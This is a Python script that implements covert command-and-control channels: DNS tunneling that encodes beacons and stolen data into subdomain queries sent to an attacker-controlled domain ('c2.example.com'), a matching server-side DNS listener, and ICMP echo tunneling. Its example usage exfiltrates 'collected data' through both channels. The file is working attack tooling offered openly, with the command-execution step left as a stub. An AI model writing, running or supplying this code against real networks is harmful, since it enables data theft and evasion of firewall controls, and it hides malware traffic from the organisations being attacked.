#!/usr/bin/env python3
"""
DNS COVERT CHANNEL - Hidden C2 communication via DNS queries.
Bypasses firewalls that allow DNS traffic.
"""

import socket
import struct
import time
import random
import base64
import hashlib
import threading
from typing import Optional, Dict, List, Tuple
from collections import defaultdict

# Configuration
C2_DOMAIN = "c2.example.com"  # Domain controlled by attacker
DNS_SERVER = "8.8.8.8"  # Public DNS or attacker's DNS
DNS_PORT = 53
BUFFER_SIZE = 4096

class DNSCovertChannel:
    """DNS tunneling for covert C2 communication."""
    
    # DNS record types
    TYPE_A = 1
    TYPE_AAAA = 28
    TYPE_TXT = 16
    TYPE_CNAME = 5
    TYPE_NULL = 10
    
    def __init__(self, domain: str = C2_DOMAIN, dns_server: str = DNS_SERVER):
        self.domain = domain
        self.dns_server = dns_server
        self.sequence = 0
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        self.pending_data = defaultdict(bytes)
        self.lock = threading.Lock()
        
    def _build_dns_query(self, subdomain: str, qtype: int = TYPE_TXT) -> bytes:
        """Build DNS query packet."""
        # Transaction ID
        transaction_id = random.randint(0, 65535)
        
        # Flags: Standard query
        flags = 0x0100
        
        # Questions: 1, Answers: 0, Authority: 0, Additional: 0
        questions = 1
        answers = 0
        authority = 0
        additional = 0
        
        # Header
        header = struct.pack(">HHHHHH", transaction_id, flags, questions, answers, authority, additional)
        
        # Question
        qname = self._encode_domain_name(f"{subdomain}.{self.domain}")
        qclass = 1  # IN
        
        question = qname + struct.pack(">HH", qtype, qclass)
        
        return header + question
    
    def _encode_domain_name(self, domain: str) -> bytes:
        """Encode domain name for DNS query."""
        result = b""
        for part in domain.split("."):
            result += bytes([len(part)]) + part.encode()
        result += b"\x00"
        return result
    
    def _decode_domain_name(self, data: bytes, offset: int) -> Tuple[str, int]:
        """Decode domain name from DNS response."""
        labels = []
        original_offset = offset
        jumped = False
        
        while True:
            length = data[offset]
            
            if length == 0:
                offset += 1
                break
            elif (length & 0xC0) == 0xC0:
                # Pointer
                if not jumped:
                    original_offset = offset + 2
                jumped = True
                pointer = struct.unpack(">H", data[offset:offset+2])[0] & 0x3FFF
                offset = pointer
            else:
                offset += 1
                labels.append(data[offset:offset+length].decode())
                offset += length
        
        if jumped:
            return ".".join(labels), original_offset
        return ".".join(labels), offset
    
    def _parse_dns_response(self, data: bytes) -> Optional[str]:
        """Parse DNS response and extract data."""
        try:
            # Parse header
            transaction_id, flags, questions, answers, authority, additional = struct.unpack(
                ">HHHHHH", data[:12]
            )
            
            if answers == 0:
                return None
            
            # Skip question section
            offset = 12
            for _ in range(questions):
                _, offset = self._decode_domain_name(data, offset)
                offset += 4  # QTYPE and QCLASS
            
            # Parse answer section
            for _ in range(answers):
                name, offset = self._decode_domain_name(data, offset)
                qtype, qclass, ttl, rdlength = struct.unpack(
                    ">HHIH", data[offset:offset+10]
                )
                offset += 10
                
                rdata = data[offset:offset+rdlength]
                offset += rdlength
                
                if qtype == self.TYPE_TXT:
                    # TXT record: first byte is length
                    txt_data = rdata[1:] if rdata else b""
                    return base64.b64decode(txt_data).decode()
                elif qtype == self.TYPE_A:
                    # A record: 4 bytes IP
                    return ".".join(str(b) for b in rdata)
                elif qtype == self.TYPE_NULL:
                    # NULL record: arbitrary data
                    return base64.b64decode(rdata).decode()
            
            return None
        except Exception as e:
            return None
    
    def encode_data(self, data: str) -> str:
        """Encode data for DNS subdomain."""
        # Base64 encode and make DNS-safe
        encoded = base64.b64encode(data.encode()).decode()
        # Replace unsafe characters
        encoded = encoded.replace("+", "-").replace("/", "_").replace("=", "")
        return encoded.lower()
    
    def decode_data(self, encoded: str) -> str:
        """Decode data from DNS subdomain."""
        # Restore Base64 characters
        encoded = encoded.replace("-", "+").replace("_", "/")
        # Add padding
        padding = 4 - (len(encoded) % 4)
        if padding != 4:
            encoded += "=" * padding
        return base64.b64decode(encoded).decode()
    
    def send_beacon(self, agent_id: str, status: str = "alive") -> bool:
        """Send beacon via DNS query."""
        # Encode: agent_id.status.sequence.session
        data = f"{agent_id}.{status}.{self.sequence}.{self.session_id}"
        subdomain = self.encode_data(data)
        
        # Send query
        query = self._build_dns_query(subdomain, self.TYPE_TXT)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            sock.sendto(query, (self.dns_server, DNS_PORT))
            
            response, _ = sock.recvfrom(BUFFER_SIZE)
            sock.close()
            
            # Parse response for commands
            result = self._parse_dns_response(response)
            if result:
                return self._process_command(result)
            
            self.sequence += 1
            return True
        except Exception as e:
            return False
    
    def _process_command(self, data: str) -> bool:
        """Process command received via DNS."""
        try:
            # Commands encoded in response
            # Format: CMD:args
            if data.startswith("CMD:"):
                cmd = data[4:]
                # Execute command (would be implemented in agent)
                return True
        except:
            pass
        return False
    
    def send_data(self, agent_id: str, data: str, chunk_size: int = 60) -> int:
        """Send data via multiple DNS queries."""
        # Split data into chunks
        encoded = self.encode_data(data)
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        sent = 0
        for i, chunk in enumerate(chunks):
            # Format: agent_id.chunk_num.total_chunks.data.session
            subdomain_data = f"{agent_id}.{i}.{len(chunks)}.{chunk}.{self.session_id}"
            subdomain = self.encode_data(subdomain_data)
            
            query = self._build_dns_query(subdomain, self.TYPE_TXT)
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(5)
                sock.sendto(query, (self.dns_server, DNS_PORT))
                sock.close()
                sent += 1
            except:
                pass
            
            time.sleep(0.1)  # Rate limiting
        
        return sent
    
    def receive_data(self, timeout: int = 30) -> Dict[str, bytes]:
        """Receive data via DNS (server-side)."""
        results = {}
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("0.0.0.0", DNS_PORT))
        sock.settimeout(timeout)
        
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            try:
                data, addr = sock.recvfrom(BUFFER_SIZE)
                
                # Parse query
                subdomain = self._extract_subdomain(data)
                if subdomain:
                    agent_id, chunk_data = self._parse_subdomain(subdomain)
                    
                    with self.lock:
                        self.pending_data[agent_id] += chunk_data.encode()
                    
                    # Send acknowledgment
                    response = self._build_dns_response(data)
                    sock.sendto(response, addr)
                    
            except socket.timeout:
                break
            except Exception as e:
                continue
        
        sock.close()
        
        with self.lock:
            results = dict(self.pending_data)
            self.pending_data.clear()
        
        return results
    
    def _extract_subdomain(self, query: bytes) -> Optional[str]:
        """Extract subdomain from DNS query."""
        try:
            # Skip header (12 bytes)
            offset = 12
            
            # Read QNAME
            labels = []
            while True:
                length = query[offset]
                if length == 0:
                    break
                offset += 1
                labels.append(query[offset:offset+length].decode())
                offset += length
            
            # Remove base domain
            full_domain = ".".join(labels)
            if full_domain.endswith(self.domain):
                subdomain = full_domain[:-len(self.domain)-1]
                return subdomain
        except:
            pass
        return None
    
    def _parse_subdomain(self, subdomain: str) -> Tuple[str, str]:
        """Parse subdomain to extract agent_id and data."""
        try:
            decoded = self.decode_data(subdomain)
            parts = decoded.split(".", 3)
            if len(parts) >= 4:
                agent_id = parts[0]
                data = parts[3]
                return agent_id, data
        except:
            pass
        return "unknown", subdomain
    
    def _build_dns_response(self, query: bytes) -> bytes:
        """Build DNS response packet."""
        # Copy transaction ID from query
        transaction_id = query[:2]
        
        # Flags: Response, Authoritative
        flags = struct.pack(">H", 0x8400)
        
        # Questions: 1, Answers: 1
        counts = struct.pack(">HHHH", 1, 1, 0, 0)
        
        # Copy question section
        question_end = query.find(b"\x00", 12) + 5  # Include QTYPE and QCLASS
        question = query[12:question_end]
        
        # Build answer
        # Name pointer (0xC00C points to first question)
        name_pointer = b"\xc0\x0c"
        
        # Type TXT, Class IN, TTL 60
        answer_header = name_pointer + struct.pack(">HHIH", self.TYPE_TXT, 1, 60, 4)
        
        # TXT data (length + data)
        txt_data = b"OK"  # Acknowledgment
        txt_record = bytes([len(txt_data)]) + txt_data
        
        return transaction_id + flags + counts + question + answer_header + txt_record


class ICMPCovertChannel:
    """ICMP tunneling for covert C2 communication."""
    
    ICMP_ECHO_REQUEST = 8
    ICMP_ECHO_REPLY = 0
    
    def __init__(self, target: str = "127.0.0.1"):
        self.target = target
        self.sequence = 0
        self.identifier = random.randint(0, 65535)
        
    def _checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum."""
        if len(data) % 2:
            data += b"\x00"
        
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff
    
    def _build_icmp_packet(self, data: bytes, icmp_type: int = ICMP_ECHO_REQUEST) -> bytes:
        """Build ICMP packet."""
        # ICMP header: type, code, checksum, identifier, sequence
        header = struct.pack(
            ">BBHHH",
            icmp_type,
            0,  # Code
            0,  # Checksum (filled later)
            self.identifier,
            self.sequence
        )
        
        # Calculate checksum
        packet = header + data
        checksum = self._checksum(packet)
        
        # Replace checksum
        packet = packet[:2] + struct.pack(">H", checksum) + packet[4:]
        
        return packet
    
    def send_data(self, data: str) -> bool:
        """Send data via ICMP echo request."""
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(5)
            
            # Build and send packet
            packet = self._build_icmp_packet(data.encode())
            sock.sendto(packet, (self.target, 0))
            
            # Receive reply
            reply = sock.recv(1024)
            sock.close()
            
            self.sequence += 1
            return True
        except Exception as e:
            return False
    
    def receive_data(self, timeout: int = 30) -> List[Tuple[str, str]]:
        """Receive data via ICMP (server-side)."""
        results = []
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(timeout)
            
            start_time = time.time()
            
            while time.time() - start_time < timeout:
                try:
                    data, addr = sock.recvfrom(1024)
                    
                    # Parse ICMP packet
                    # IP header is 20 bytes, ICMP starts after
                    icmp_data = self._parse_icmp_packet(data[20:])
                    
                    if icmp_data:
                        results.append((addr[0], icmp_data))
                        
                        # Send reply
                        reply = self._build_icmp_packet(b"ACK", self.ICMP_ECHO_REPLY)
                        sock.sendto(reply, addr)
                        
                except socket.timeout:
                    break
                except:
                    continue
            
            sock.close()
        except:
            pass
        
        return results
    
    def _parse_icmp_packet(self, data: bytes) -> Optional[str]:
        """Parse ICMP packet and extract payload."""
        try:
            icmp_type, code, checksum, identifier, sequence = struct.unpack(
                ">BBHHH", data[:8]
            )
            
            if icmp_type == self.ICMP_ECHO_REQUEST:
                # Extract payload
                payload = data[8:]
                return payload.decode()
        except:
            pass
        return None


# Integration with C2
class CovertChannelManager:
    """Manager for multiple covert channels."""
    
    def __init__(self, c2_domain: str, dns_server: str = "8.8.8.8"):
        self.dns = DNSCovertChannel(c2_domain, dns_server)
        self.icmp = ICMPCovertChannel()
        self.channels = {
            "dns": self.dns,
            "icmp": self.icmp
        }
    
    def send_beacon(self, agent_id: str, channel: str = "dns") -> bool:
        """Send beacon via specified channel."""
        if channel in self.channels:
            if channel == "dns":
                return self.dns.send_beacon(agent_id)
            elif channel == "icmp":
                return self.icmp.send_data(f"BEACON:{agent_id}")
        return False
    
    def send_data(self, agent_id: str, data: str, channel: str = "dns") -> bool:
        """Send data via specified channel."""
        if channel == "dns":
            return self.dns.send_data(agent_id, data) > 0
        elif channel == "icmp":
            return self.icmp.send_data(data)
        return False


# Example usage
if __name__ == "__main__":
    # DNS channel
    dns_channel = DNSCovertChannel("c2.example.com", "8.8.8.8")
    
    # Send beacon
    dns_channel.send_beacon("agent123", "alive")
    
    # Send data
    dns_channel.send_data("agent123", "collected_data_here")
    
    # ICMP channel
    icmp_channel = ICMPCovertChannel("192.168.1.100")
    icmp_channel.send_data("test_data_via_icmp")
    
    print("Covert channels ready")
